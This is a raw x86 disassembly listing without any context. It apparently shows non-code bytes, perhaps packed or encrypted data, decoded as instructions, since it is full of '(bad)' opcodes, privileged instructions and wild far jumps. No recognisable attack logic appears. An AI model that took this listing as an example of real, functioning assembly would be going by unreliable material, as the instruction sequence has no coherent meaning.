  40ae7d:	mov    BYTE PTR [eax-0x22d1552f],ch
  40ae83:	leave  
  40ae84:	call   0xd8c04cef
  40ae89:	pop    es
  40ae8a:	stos   BYTE PTR es:[edi],al
  40ae8b:	(bad)  
  40ae8d:	xor    DWORD PTR ds:0xf834e488,esp
  40ae93:	sahf   
  40ae94:	hlt    
  40ae95:	fwait
  40ae96:	cld    
  40ae97:	stos   BYTE PTR es:[edi],al
  40ae98:	int3   
  40ae99:	mov    edx,0xa29f35d9
  40ae9e:	mov    edx,0xca985d3f
  40aea3:	xchg   ebp,eax
  40aea4:	fs pop ecx
  40aea6:	clc    
  40aea7:	mov    ch,0xd0
  40aea9:	or     eax,0x43eba13f
  40aeae:	loopne 0x40ae50
  40aeb0:	inc    edx
  40aeb1:	addr16 dec bp
  40aeb4:	es pop esi
  40aeb6:	and    DWORD PTR ds:0x2858afdc,ebp
  40aebc:	nop
  40aebd:	inc    edx
  40aebe:	mov    eax,ds:0xc1df1093
  40aec3:	test   al,0x41
  40aec5:	test   al,0xc7
  40aec7:	aam    0x2a
  40aec9:	adc    al,0x3a
  40aecb:	jmp    0x40ae95
  40aecd:	cld    
  40aece:	int    0x31
  40aed0:	jge    0x40ae7c
  40aed2:	pop    ds
  40aed3:	push   edx
  40aed4:	mov    ebx,0x7e993b16
  40aed9:	sub    eax,0xd382004d
  40aede:	fwait
  40aedf:	sbb    al,0xa6
  40aee1:	and    ecx,edi
  40aee3:	unpckhps xmm7,XMMWORD PTR [esi]
  40aee6:	or     eax,0xc770d30c
  40aeeb:	mov    al,0xc5
  40aeed:	hlt    
  40aeee:	stc    
  40aeef:	xchg   ecx,eax
  40aef0:	(bad)  
  40aef1:	cmc    
  40aef2:	ja     0x40af18
  40aef4:	or     cl,0x18
  40aef7:	and    edi,eax
  40aef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aefa:	dec    edi
  40aefb:	adc    al,0x5c
  40aefd:	popf   
  40aefe:	in     al,0xc0
  40af00:	lock push esi
  40af03:	fwait
  40af04:	inc    esi
  40af05:	cwde   
  40af06:	leave  
  40af07:	ins    BYTE PTR es:[edi],dx
  40af08:	push   0x9229ae0a
  40af0d:	retf   
  40af0e:	call   0xe2e2:0xa18bbedd
  40af15:	xor    cl,bl
  40af17:	jae    0x40af3c
  40af19:	mov    bl,0xa5
  40af1b:	pop    ds
  40af1c:	imul   edx,DWORD PTR [ecx+ebp*8],0x9d3a2698
  40af23:	pop    ebp
  40af24:	call   0x3474c23d
  40af29:	mov    esi,0x6bec5763
  40af2e:	scas   al,BYTE PTR es:[edi]
  40af2f:	cs push ebx
  40af31:	retf   
  40af32:	mov    bh,0x7c
  40af34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af35:	out    dx,al
  40af36:	xor    al,0xee
  40af38:	pushf  
  40af39:	mov    edi,0xb4a941c1
  40af3e:	rcr    BYTE PTR [edi-0x3c5636a6],1
  40af44:	xor    edi,ecx
  40af46:	xor    ebx,esi
  40af48:	je     0x40aed4
  40af4a:	iret   
  40af4b:	pusha  
  40af4c:	popf   
  40af4d:	pushf  
  40af4e:	or     eax,ebx
  40af50:	add    ah,cl
  40af52:	sbb    BYTE PTR [esi],bh
  40af54:	push   ds
  40af55:	mov    ds:0x6d485022,al
  40af5a:	push   0x2475d1d
  40af5f:	push   edx
  40af60:	retf   
  40af61:	sbb    BYTE PTR [ecx],dh
  40af63:	hlt    
  40af64:	mov    dl,0x70
  40af66:	mov    bl,0x5c
  40af68:	and    ah,cl
  40af6a:	pop    edx
  40af6b:	in     eax,0x6d
  40af6d:	aad    0x23
  40af6f:	cdq    
  40af70:	ret    
  40af71:	cdq    
  40af72:	test   BYTE PTR [eax+0x19980141],dh
  40af78:	pop    ds
  40af79:	es (bad) 
  40af7b:	jecxz  0x40afa1
  40af7d:	fist   WORD PTR [esi+0x0]
  40af80:	push   es
  40af81:	mov    esi,0xbafe925b
  40af86:	shl    DWORD PTR [ecx+0x14],cl
  40af89:	(bad)  
  40af8a:	sub    ah,al
  40af8c:	cli    
  40af8d:	mov    ds:0xdd4e20a2,eax
  40af92:	nop
  40af93:	shl    BYTE PTR [edx-0x1],1
  40af96:	pop    ebp
  40af97:	lahf   
  40af98:	hlt    
  40af99:	xchg   ecx,eax
  40af9a:	dec    esp
  40af9b:	mov    esp,0xc0bc5fb
  40afa0:	test   eax,0xd1795d45
  40afa5:	frstor [ebp-0x2b8658f1]
  40afab:	sub    eax,0x791fb399
  40afb0:	pop    edi
  40afb1:	icebp  
  40afb2:	mov    ch,0xb7
  40afb4:	or     BYTE PTR [eax+0x3eacb88e],0xe
  40afbb:	in     al,0xd0
  40afbd:	retf   
  40afbe:	(bad)  
  40afbf:	nop
  40afc0:	cmp    ecx,ebp
  40afc2:	rcr    BYTE PTR [edx-0x32],1
  40afc5:	arpl   sp,sp
  40afc7:	dec    esp
  40afc8:	cwde   
  40afc9:	aas    
  40afca:	mov    dh,0x5b
  40afcc:	add    ebx,DWORD PTR [ebp+0xab7d1a4]
  40afd2:	pop    esp
  40afd3:	inc    ecx
  40afd4:	lahf   
  40afd5:	mov    cl,0x5f
  40afd7:	push   0xfffffff2
  40afd9:	mul    DWORD PTR [ebx]
  40afdb:	pushf  
  40afdc:	mov    cl,0x3a
  40afde:	jbe    0x40af62
  40afe0:	out    dx,eax
  40afe1:	xor    eax,0x6f56ee45
  40afe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afe7:	cdq    
  40afe8:	ja     0x40af90
  40afea:	pop    ss
  40afeb:	fmul   QWORD PTR [esi+ecx*1-0x6758c7c5]
  40aff2:	cmc    
  40aff3:	sub    DWORD PTR [esi+0x427a88e9],edi
  40aff9:	in     eax,dx
  40affa:	xor    eax,esp
  40affc:	mov    ss,WORD PTR [eax]
  40affe:	sub    BYTE PTR [esi+0x48],al
  40b001:	(bad)  [esi]
  40b003:	xchg   ebx,eax
  40b004:	ret    
  40b005:	pop    edx
  40b006:	mov    ebx,0x844578d
  40b00b:	sbb    DWORD PTR [ebp-0x1e0f4b58],ebx
  40b011:	cmp    al,0x49
  40b013:	ins    BYTE PTR es:[edi],dx
  40b014:	(bad)  
  40b015:	xchg   ebx,eax
  40b016:	and    BYTE PTR [esi+0x4d],0x14
  40b01a:	push   edi
  40b01b:	retf   0xc374
  40b01e:	js     0x40afa8
  40b020:	inc    edi
  40b021:	in     eax,0xfe
  40b023:	sbb    BYTE PTR [edx+0x2b07109e],ah
  40b029:	fcom   QWORD PTR [ecx]
  40b02b:	ret    
  40b02c:	mov    edi,0xebc01d85
  40b031:	cmp    eax,0xc3d7ac7c
  40b036:	(bad)  
  40b037:	call   0x98ae:0xb815d7b6
  40b03e:	sub    eax,0x37579952
  40b043:	push   ss
  40b044:	add    esp,DWORD PTR [ecx]
  40b046:	jge    0x40b07e
  40b048:	fwait
  40b049:	(bad)  
  40b04a:	and    BYTE PTR [edx+0x33],cl
  40b04d:	cld    
  40b04e:	mov    ah,0x31
  40b050:	loopne 0x40b036
  40b052:	push   ebx
  40b053:	sub    DWORD PTR [edx],edx
  40b055:	sub    al,0xbd
  40b057:	das    
  40b058:	push   edi
  40b059:	adc    DWORD PTR [edx+0x16],eax
  40b05c:	add    ch,BYTE PTR [eax-0x26e458ee]
  40b062:	into   
  40b063:	ds inc esp
  40b065:	enter  0xcf99,0x48
  40b069:	pop    es
  40b06a:	fdiv   QWORD PTR [esi]
  40b06c:	inc    esi
  40b06d:	in     eax,0x4a
  40b06f:	fmul   st,st(1)
  40b071:	fidivr DWORD PTR [ecx-0x3d0e600a]
  40b077:	out    dx,eax
  40b078:	ja     0x40b091
  40b07a:	inc    ecx
  40b07b:	test   DWORD PTR [esi+0x21380fda],edi
  40b081:	dec    ecx
  40b082:	out    dx,eax
  40b083:	xchg   ebp,eax
  40b084:	push   cs
  40b085:	and    DWORD PTR [eax+0x16fb1c2c],0xfffffff5
  40b08c:	stos   DWORD PTR es:[edi],eax
  40b08d:	inc    ebx
  40b08e:	in     eax,dx
  40b08f:	repz mov esp,0xe04abcfb
  40b095:	mov    al,0x49
  40b097:	mov    al,ds:0x31b29f06
  40b09c:	(bad)  
  40b09e:	lods   eax,DWORD PTR ds:[esi]
  40b09f:	call   0x2663:0xba9ea67c
  40b0a6:	push   es
  40b0a7:	jmp    0x664d0682
  40b0ac:	ret    
  40b0ad:	mov    dl,0xb7
  40b0af:	push   es
  40b0b0:	loope  0x40b088
  40b0b2:	sar    dl,1
  40b0b4:	mov    ebx,0xa1315871
  40b0b9:	loopne 0x40b0d9
  40b0bb:	dec    eax
  40b0bc:	and    ebp,DWORD PTR [esi-0x22]
  40b0bf:	es into 
  40b0c1:	add    BYTE PTR [ebp-0x20189420],ch
  40b0c7:	jmp    0x5503:0xb92b2589
  40b0ce:	(bad)  
  40b0d0:	mov    BYTE PTR [esi+0x7f48637],0xb1
  40b0d7:	or     eax,0x5a6d4208
  40b0dc:	test   BYTE PTR [ecx-0x1e5fdc96],ah
  40b0e2:	xor    BYTE PTR [ebx+0x18],dl
  40b0e5:	xchg   esp,eax
  40b0e6:	popa   
  40b0e7:	inc    ecx
  40b0e8:	test   al,0xb0
  40b0ea:	xchg   ebx,eax
  40b0eb:	shl    DWORD PTR [ecx],1
  40b0ed:	xchg   BYTE PTR ds:[esi+0x39f32828],cl
  40b0f4:	test   DWORD PTR [ebx+ecx*8-0x39],eax
  40b0f8:	test   al,0x97
  40b0fa:	out    0x1b,al
  40b0fc:	aad    0xfc
  40b0fe:	push   0xffffff8c
  40b100:	ins    DWORD PTR es:[edi],dx
  40b101:	mov    bh,0xdd
  40b103:	adc    al,0x74
  40b105:	jnp    0x40b0e3
  40b107:	inc    esp
  40b108:	pop    esp
  40b109:	cwde   
  40b10a:	ja     0x40b156
  40b10c:	imul   ecx,DWORD PTR [ebp+0x365e0c8c],0xffffffc6
  40b113:	sbb    eax,0xbe5c66ee
  40b118:	jecxz  0x40b111
  40b11a:	les    edx,FWORD PTR [ebp+0x33e83a60]
  40b120:	popf   
  40b121:	neg    BYTE PTR [esi-0xd2a33c4]
  40b127:	push   edi
  40b128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b129:	lock inc ebx
  40b12b:	dec    eax
  40b12c:	enter  0x7aa4,0xff
  40b130:	into   
  40b131:	add    al,0xcf
  40b133:	arpl   WORD PTR [edi+ebx*8+0x5202b307],di
  40b13a:	clc    
  40b13b:	outs   dx,DWORD PTR ds:[esi]
  40b13c:	jmp    0x39ca:0xb13d437a
  40b143:	jge    0x40b11e
  40b145:	stos   DWORD PTR es:[edi],eax
  40b146:	and    DWORD PTR [edi-0x7464ec38],eax
  40b14c:	mov    BYTE PTR [ecx],ch
  40b14e:	stos   BYTE PTR es:[edi],al
  40b14f:	xchg   bh,dh
  40b151:	adc    eax,0xf09a7431
  40b156:	rol    DWORD PTR [ebx],cl
  40b158:	stos   BYTE PTR es:[edi],al
  40b159:	or     DWORD PTR [edi-0x4dceee58],ebp
  40b15f:	ret    
  40b160:	jb     0x40b1db
  40b162:	push   ss
  40b163:	shl    ecx,1
  40b165:	ja     0x40b164
  40b167:	mov    WORD PTR [eax+eax*1],ds
  40b16a:	pop    esi
  40b16b:	stos   DWORD PTR es:[edi],eax
  40b16c:	adc    eax,0x4cec405
  40b171:	rcl    BYTE PTR [edi-0x72],cl
  40b174:	or     DWORD PTR [esi+0x389a83dd],ebx
  40b17a:	and    BYTE PTR [ebx+eiz*4],bl
  40b17d:	push   edx
  40b17e:	jo     0x40b129
  40b180:	cld    
  40b181:	and    eax,DWORD PTR ss:[eax-0x5520ba08]
  40b188:	xor    esi,DWORD PTR [ebp+0x3188fcfb]
  40b18e:	inc    esp
  40b18f:	shl    BYTE PTR [edi+0x11],0x40
  40b193:	fwait
  40b194:	loope  0x40b142
  40b196:	(bad)  
  40b197:	retf   0xa711
  40b19a:	cmc    
  40b19b:	xor    eax,0xe4147cc3
  40b1a0:	sbb    al,0xbe
  40b1a2:	in     eax,0x6d
  40b1a4:	ja     0x40b16e
  40b1a6:	jecxz  0x40b149
  40b1a8:	repz sub DWORD PTR [edi],esp
  40b1ab:	inc    edx
  40b1ac:	xchg   BYTE PTR [edx-0x1abff133],ch
  40b1b2:	in     al,0x30
  40b1b4:	mov    eax,0x145bc0e2
  40b1b9:	inc    eax
  40b1ba:	out    0xbd,eax
  40b1bc:	ins    BYTE PTR es:[edi],dx
  40b1bd:	not    DWORD PTR [edi+0x7b1db8e5]
  40b1c3:	ins    BYTE PTR es:[edi],dx
  40b1c4:	loope  0x40b1d3
  40b1c6:	popa   
  40b1c7:	daa    
  40b1c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1c9:	push   ebx
  40b1ca:	cmp    DWORD PTR [ecx-0x2212ab8],eax
  40b1d0:	xlat   BYTE PTR ds:[ebx]
  40b1d1:	ss inc ebp
  40b1d3:	mov    ebp,0x773463d3
  40b1d8:	cwde   
  40b1d9:	sbb    eax,0xd3878a58
  40b1de:	mov    cl,bl
  40b1e0:	ins    DWORD PTR es:[edi],dx
  40b1e1:	rol    BYTE PTR [edi],0xe3
  40b1e4:	(bad)  
  40b1e5:	push   esi
  40b1e6:	xchg   ebx,eax
  40b1e7:	lods   eax,DWORD PTR ds:[esi]
  40b1e8:	std    
  40b1e9:	dec    ecx
  40b1ea:	loope  0x40b1ec
  40b1ec:	inc    esi
  40b1ed:	out    dx,eax
  40b1ee:	in     eax,dx
  40b1ef:	shl    al,1
  40b1f1:	or     ebx,esp
  40b1f3:	jmp    0xeada3e8d
  40b1f8:	sub    edi,DWORD PTR [eax+0x1bb1470f]
  40b1fe:	push   ss
  40b1ff:	or     al,0x33
  40b201:	fs mov bh,0x70
  40b204:	or     al,0x1f
  40b206:	int3   
  40b207:	mov    bl,0x55
  40b209:	jge    0x40b1eb
  40b20b:	das    
  40b20c:	cmovo  ebp,edx
  40b20f:	call   0xd92c:0x7511de11
  40b216:	sahf   
  40b217:	sub    edx,DWORD PTR [edx+0x43a7eaeb]
  40b21d:	aam    0x19
  40b21f:	hlt    
  40b220:	stos   BYTE PTR es:[edi],al
  40b221:	add    eax,0x2106c545
  40b226:	fwait
  40b227:	pop    esp
  40b228:	mov    ebp,ebp
  40b22a:	loope  0x40b251
  40b22c:	scas   al,BYTE PTR es:[edi]
  40b22d:	das    
  40b22e:	(bad)  
  40b22f:	push   ebp
  40b230:	and    cl,BYTE PTR [edx]
  40b232:	push   ds
  40b233:	mul    DWORD PTR [ecx+eiz*4+0x661b8f3a]
  40b23a:	or     DWORD PTR [ebp-0x11691d89],esi
  40b240:	cli    
  40b241:	or     dl,0xb5
  40b244:	retf   
  40b245:	mov    al,ds:0x7f751585
  40b24a:	cmp    eax,0x731412e6
  40b24f:	les    esi,FWORD PTR [ebx+0x46987f4f]
  40b255:	frstor [eax+0x2f]
  40b258:	or     ebp,esp
  40b25a:	jmp    0x4cae:0x589b08ad
  40b261:	xchg   ebp,eax
  40b262:	icebp  
  40b263:	cdq    
  40b264:	vpxor  ymm0,ymm2,YMMWORD PTR [ebx+0x6d088f56]
  40b26c:	or     al,0xe4
  40b26e:	mov    eax,DWORD PTR [edi]
  40b270:	nop
  40b271:	sbb    eax,0xede4ac4f
  40b276:	test   DWORD PTR [edi+0x1bc60816],esp
  40b27c:	leave  
  40b27d:	pusha  
  40b27e:	mov    eax,0x7ac84886
  40b283:	dec    ebx
  40b284:	fadd   st,st(7)
  40b286:	xchg   BYTE PTR [edi+ebx*2-0x76f85ea3],ch
  40b28d:	dec    ebp
  40b28e:	add    esi,DWORD PTR [esi+ecx*4]
  40b291:	cmc    
  40b292:	ds pop edi
  40b294:	inc    ecx
  40b295:	cmp    edx,DWORD PTR [edx+0x13]
  40b298:	fisttp DWORD PTR [esi]
  40b29a:	push   0x23
  40b29c:	call   FWORD PTR [edi]
  40b29e:	scas   al,BYTE PTR es:[edi]
  40b29f:	xlat   BYTE PTR ds:[ebx]
  40b2a0:	lods   eax,DWORD PTR ds:[esi]
  40b2a1:	adc    eax,0xd2b30e54
  40b2a6:	mov    al,0x15
  40b2a8:	jge    0x40b2a7
  40b2aa:	test   eax,0x23937b87
  40b2af:	jne    0x40b297
  40b2b1:	push   ss
  40b2b2:	pop    ecx
  40b2b3:	sub    al,0x51
  40b2b5:	imul   ebx,DWORD PTR [ecx-0x2a],0x64
  40b2b9:	or     edi,DWORD PTR [ebp+0x6a65800c]
  40b2bf:	dec    eax
  40b2c0:	xchg   esp,eax
  40b2c1:	push   esi
  40b2c2:	aad    0xf3
  40b2c4:	sub    esp,esp
  40b2c6:	push   ebp
  40b2c7:	mov    ecx,0x39e5cc20
  40b2cc:	les    ebp,FWORD PTR [eax]
  40b2ce:	lods   eax,DWORD PTR ds:[esi]
  40b2cf:	mov    ebp,0x3d35f7f7
  40b2d4:	or     bh,dl
  40b2d6:	(bad)  
  40b2d7:	mov    eax,0xc95885a3
  40b2dc:	sub    eax,0xf629941f
  40b2e1:	mov    al,ds:0x14dddfd6
  40b2e6:	nop
  40b2e7:	rol    ch,cl
  40b2e9:	gs es pop ebx
  40b2ec:	retf   0xb4b7
  40b2ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2f0:	(bad)  
  40b2f1:	retf   
  40b2f2:	dec    edi
  40b2f3:	hlt    
  40b2f4:	add    al,0x7
  40b2f6:	adc    eax,DWORD PTR [edi-0x32abb377]
  40b2fc:	pop    eax
  40b2fd:	jmp    0xbd0e51c3
  40b302:	inc    ebp
  40b303:	mov    ds:0x988549a5,al
  40b308:	jp     0x40b338
  40b30a:	pop    ds
  40b30b:	outs   dx,BYTE PTR ds:[esi]
  40b30c:	pushf  
  40b30d:	int3   
  40b30e:	cdq    
  40b30f:	gs scas al,BYTE PTR es:[edi]
  40b311:	hlt    
  40b312:	test   al,0x72
  40b314:	xchg   edi,eax
  40b315:	ss out dx,al
  40b317:	(bad)  
  40b319:	adc    al,0xeb
  40b31b:	dec    esp
  40b31c:	inc    esp
  40b31d:	xor    BYTE PTR [edi],ah
  40b31f:	sbb    al,ah
  40b321:	push   ecx
  40b322:	outs   dx,DWORD PTR ds:[esi]
  40b323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b324:	mov    dl,ch
  40b326:	cmp    BYTE PTR [edx],cl
  40b328:	or     bh,BYTE PTR [ecx+0x7c86eed7]
  40b32e:	push   esi
  40b32f:	push   edi
  40b330:	jp     0x40b30b
  40b332:	ret    
  40b333:	sti    
  40b334:	sbb    eax,DWORD PTR [eax]
  40b336:	into   
  40b337:	mov    ds:0x5489d644,al
  40b33c:	es dec ebp
  40b33e:	popf   
  40b33f:	das    
  40b340:	lods   eax,DWORD PTR ds:[esi]
  40b341:	inc    ebp
  40b342:	int    0x4
  40b344:	jae    0x40b374
  40b346:	mov    bh,0x3d
  40b348:	and    al,cl
  40b34a:	push   es
  40b34b:	(bad)  
  40b34c:	cmp    BYTE PTR [ecx],ch
  40b34e:	xchg   BYTE PTR [eax+0x67],bl
  40b351:	jp     0x40b3a9
  40b353:	xchg   edx,eax
  40b354:	ret    
  40b355:	pop    ss
  40b356:	cld    
  40b357:	jno    0x40b3c9
  40b359:	mov    esi,0xc888e172
  40b35e:	ret    0x891c
  40b361:	retf   0xfe40
  40b364:	xor    ecx,eax
  40b366:	inc    edi
  40b367:	cmc    
  40b368:	inc    edi
  40b369:	popa   
  40b36a:	in     eax,0x72
  40b36c:	add    eax,0x1b47dc5e
  40b371:	cdq    
  40b372:	int3   
  40b373:	stos   DWORD PTR es:[edi],eax
  40b374:	mov    DWORD PTR [ebp+0x41],ebx
  40b377:	sub    DWORD PTR [edx+eiz*4],0x40
  40b37b:	jecxz  0x40b32e
  40b37d:	inc    esp
  40b37e:	ret    0x7048
  40b381:	outs   dx,DWORD PTR ds:[esi]
  40b382:	adc    esi,DWORD PTR [ebx]
  40b384:	pop    ss
  40b385:	adc    BYTE PTR [ebp+ecx*2-0x62],dh
  40b389:	out    dx,eax
  40b38a:	inc    esi
  40b38b:	dec    edi
  40b38c:	out    dx,eax
  40b38d:	jo     0x40b316
  40b38f:	xchg   edx,eax
  40b390:	ins    BYTE PTR es:[edi],dx
  40b391:	fadd   st(7),st
  40b393:	mov    ebx,0x27a055d8
  40b398:	call   0xd2299ef
  40b39d:	imul   ebp,DWORD PTR [edi+0x7f],0xffffffcd
  40b3a1:	adc    al,0x47
  40b3a3:	sbb    BYTE PTR [ebx+0xf],dh
  40b3a6:	fadd   QWORD PTR [eax+0x55be0e1e]
  40b3ac:	addr16 hlt 
  40b3ae:	out    0xfa,eax
  40b3b0:	xor    eax,0xc56833dc
  40b3b5:	shl    DWORD PTR [esi-0x569c4b71],0x32
  40b3bc:	mov    WORD PTR [ecx+ebx*8-0x2762688],es
  40b3c3:	lds    esp,FWORD PTR cs:[edx+ebp*8+0xf914492]
  40b3cb:	(bad)  
  40b3cc:	pop    edi
  40b3cd:	jge    0x40b3e0
  40b3cf:	cmp    al,cl
  40b3d1:	lods   eax,DWORD PTR ds:[esi]
  40b3d2:	shl    BYTE PTR [esi],1
  40b3d4:	and    edx,esi
  40b3d6:	xor    bh,bh
  40b3d8:	cs pop esp
  40b3da:	sub    al,0x62
  40b3dc:	clc    
  40b3dd:	stc    
  40b3de:	retf   0x5a0
  40b3e1:	sbb    eax,0xb17846cf
  40b3e6:	jo     0x40b3ef
  40b3e8:	inc    ecx
  40b3e9:	fbstp  TBYTE PTR [edx]
  40b3eb:	call   0xb837:0x96e951ae
  40b3f2:	inc    esp
  40b3f3:	jl     0x40b3a8
  40b3f5:	inc    ebp
  40b3f6:	(bad)  
  40b3f8:	shl    BYTE PTR [ebp+0x70],0x70
  40b3fc:	jp     0x40b39d
  40b3fe:	in     al,dx
  40b3ff:	push   esp
  40b400:	out    dx,al
  40b401:	bnd jmp 0x4b17cd30
  40b407:	push   ecx
  40b408:	push   edi
  40b409:	xor    cl,BYTE PTR [edi]
  40b40b:	out    dx,eax
  40b40c:	(bad)  
  40b40d:	out    0xb0,eax
  40b40f:	arpl   dx,bx
  40b411:	cmp    ecx,ebp
  40b413:	cdq    
  40b414:	push   es
  40b415:	js     0x40b3da
  40b417:	fiadd  DWORD PTR [edi+0x13]
  40b41a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b41b:	add    BYTE PTR [ecx+ebp*4-0x33e76f19],ch
  40b422:	into   
  40b423:	xchg   edx,eax
  40b424:	xchg   ecx,eax
  40b425:	cmp    eax,0x8fb87f7a
  40b42a:	sub    ah,dh
  40b42c:	xor    eax,0x9d8c4785
  40b431:	push   eax
  40b432:	adc    eax,0x76769550
  40b437:	test   al,0x2e
  40b439:	cmc    
  40b43a:	call   0xeec29d4e
  40b43f:	add    DWORD PTR [ecx-0x22bb023a],0x34709633
  40b449:	shr    BYTE PTR [eax+0x11],0x7b
  40b44d:	jmp    0x40b40b
  40b44f:	ins    BYTE PTR es:[edi],dx
  40b450:	aam    0xe1
  40b452:	addr16 and al,0x1e
  40b455:	stc    
  40b456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b457:	(bad)  
  40b458:	xchg   edx,eax
  40b459:	icebp  
  40b45a:	pop    ss
  40b45b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b45c:	mov    edi,DWORD PTR ds:0xdb9edc60
  40b462:	shr    BYTE PTR [eax+0x38c906c0],cl
  40b468:	nop
  40b469:	imul   edi,DWORD PTR ds:0x70e41334,0x6947d3d2
  40b473:	dec    eax
  40b474:	bound  ebx,QWORD PTR [esi-0xfe0f187]
  40b47a:	mov    edx,0xce64afd4
  40b47f:	imul   ch
  40b481:	inc    edx
  40b482:	dec    eax
  40b483:	mov    edi,0xeb2877d0
  40b488:	shl    BYTE PTR [esi+0x59],cl
  40b48b:	or     ah,al
  40b48d:	mov    DWORD PTR [edi],0x2fbf2bf4
  40b493:	aaa    
  40b494:	stos   DWORD PTR es:[edi],eax
  40b495:	add    DWORD PTR [eax-0x58d71070],eax
  40b49b:	xor    ch,dl
  40b49d:	icebp  
  40b49e:	mov    dl,0x7c
  40b4a0:	xor    esp,DWORD PTR [esi+ecx*8-0x20]
  40b4a4:	cmp    BYTE PTR [edi],ah
  40b4a6:	push   ebp
  40b4a7:	ret    0xf045
  40b4aa:	dec    ecx
  40b4ab:	pop    ss
  40b4ac:	test   al,0x21
  40b4ae:	and    cl,BYTE PTR [ebx-0x5a99ae70]
  40b4b4:	push   cs
  40b4b5:	jno    0x40b437
  40b4b7:	js     0x40b4b8
  40b4b9:	inc    eax
  40b4ba:	fwait
  40b4bb:	cmp    dl,BYTE PTR [ecx-0x42]
  40b4be:	mov    ebp,0x4178dd8b
  40b4c3:	pushf  
  40b4c4:	cli    
  40b4c5:	ret    0xb25c
  40b4c8:	fimul  DWORD PTR [ebp-0x35]
  40b4cb:	(bad)  
  40b4cd:	ja     0x40b495
  40b4cf:	cmp    cl,BYTE PTR [esi-0x71]
  40b4d2:	enter  0x9e47,0x50
  40b4d6:	adc    bl,ch
  40b4d8:	push   eax
  40b4d9:	pop    ss
  40b4da:	sbb    DWORD PTR [esi],edi
  40b4dc:	rcl    dl,cl
  40b4de:	jo     0x40b521
  40b4e0:	adc    bl,bl
  40b4e2:	repnz xchg esi,eax
  40b4e4:	jo     0x40b478
  40b4e6:	ins    BYTE PTR es:[edi],dx
  40b4e7:	out    0xef,eax
  40b4e9:	(bad)  
  40b4ea:	push   esp
  40b4eb:	jbe    0x40b4a0
  40b4ed:	mov    ds:0xc6dd7539,eax
  40b4f2:	xchg   edi,eax
  40b4f3:	outs   dx,BYTE PTR ds:[esi]
  40b4f4:	jmp    0xd2df:0x8c0fdc32
  40b4fb:	dec    eax
  40b4fc:	sub    DWORD PTR [esp+edx*2],edx
  40b4ff:	mov    eax,ds:0xef6e2a77
  40b504:	(bad)  
  40b506:	outs   dx,DWORD PTR ds:[esi]
  40b507:	sub    al,0x4e
  40b509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b50a:	push   eax
  40b50b:	jge    0x40b514
  40b50d:	rcl    BYTE PTR [ecx-0x58364fa5],cl
  40b513:	xchg   ecx,eax
  40b514:	mov    ebx,0xc351dabe
  40b519:	pop    ss
  40b51a:	test   al,0xcd
  40b51c:	lds    ebp,FWORD PTR [esi+ebx*1-0x6b]
  40b520:	adc    edi,DWORD PTR [ebx+0x1b721753]
  40b526:	pop    ds
  40b527:	dec    ecx
  40b528:	enter  0x4943,0x15
  40b52c:	mov    BYTE PTR [edi+ebx*4+0x2f19bc56],bl
  40b533:	push   edi
  40b534:	lea    eax,[edi+eax*8]
  40b537:	jge    0x40b594
  40b539:	dec    ecx
  40b53a:	and    al,0xdb
  40b53c:	rcr    BYTE PTR [ebp+0x73f0fb5c],0x3a
  40b543:	cmp    DWORD PTR [edi-0x1a29b60e],eax
  40b549:	sub    bl,BYTE PTR [eax]
  40b54b:	adc    bl,BYTE PTR [ecx]
  40b54d:	cmpps  xmm6,XMMWORD PTR [esi-0x40839f07],0xb4
  40b555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b556:	pop    esp
  40b557:	push   0x66dd7510
  40b55c:	out    dx,al
  40b55d:	shr    DWORD PTR [edi-0x391eba95],cl
  40b563:	sbb    DWORD PTR [ebx],esi
  40b565:	dec    eax
  40b566:	enter  0x853b,0x9b
  40b56a:	aad    0x50
  40b56c:	adc    edi,DWORD PTR [eax]
  40b56e:	sbb    ch,BYTE PTR [edi-0x38952c85]
  40b574:	scas   al,BYTE PTR es:[edi]
  40b575:	cmp    BYTE PTR [eax-0x55335ba4],ah
  40b57b:	retf   
  40b57c:	mov    dl,0x8c
  40b57e:	add    DWORD PTR [edx+0x61942119],ebp
  40b584:	push   ds
  40b585:	xchg   ebx,eax
  40b586:	or     esp,esi
  40b588:	pop    esp
  40b589:	add    eax,0xfef9ccd8
  40b58e:	enter  0x1394,0x43
  40b592:	pop    ecx
  40b593:	cmp    BYTE PTR [esi+0x410fad9a],0xf7
  40b59a:	ds mov cl,0x60
  40b59d:	and    DWORD PTR [edx-0x60b323a7],0xd7bb7a0e
  40b5a7:	js     0x40b617
  40b5a9:	mov    WORD PTR [ecx],cs
  40b5ab:	scas   al,BYTE PTR es:[edi]
  40b5ac:	shl    DWORD PTR [ebp+0x3779b6c5],1
  40b5b2:	mov    esi,fs
  40b5b4:	sbb    bl,al
  40b5b6:	mov    bh,0x7e
  40b5b8:	push   ds
  40b5b9:	pop    edi
  40b5ba:	into   
  40b5bb:	inc    ebx
  40b5bc:	rcr    DWORD PTR [ebx+esi*2-0x2fdc083],1
  40b5c3:	pop    edi
  40b5c4:	bound  esp,QWORD PTR [esi-0x39]
  40b5c7:	test   BYTE PTR [eax],ch
  40b5c9:	mov    ebp,0x1e7b4fc8
  40b5ce:	adc    ecx,DWORD PTR [ebp+0x71]
  40b5d1:	fimul  WORD PTR [edi-0x12]
  40b5d4:	es aas 
  40b5d6:	verr   WORD PTR [edx+0x59]
  40b5da:	outs   dx,DWORD PTR ds:[esi]
  40b5db:	(bad)  
  40b5dc:	dec    ebx
  40b5dd:	push   es
  40b5de:	add    ch,BYTE PTR [ebx+esi*4-0x5d5c158]
  40b5e5:	adc    eax,0x40f84000
  40b5ea:	outs   dx,BYTE PTR ds:[esi]
  40b5eb:	mov    ecx,0x2ac26bef
  40b5f0:	aaa    
  40b5f1:	jbe    0x40b598
  40b5f3:	xchg   edx,eax
  40b5f4:	xchg   esi,eax
  40b5f5:	ficomp DWORD PTR [ebx+0x7b]
  40b5f8:	xor    DWORD PTR [ebx-0x5b4012e8],0x7b
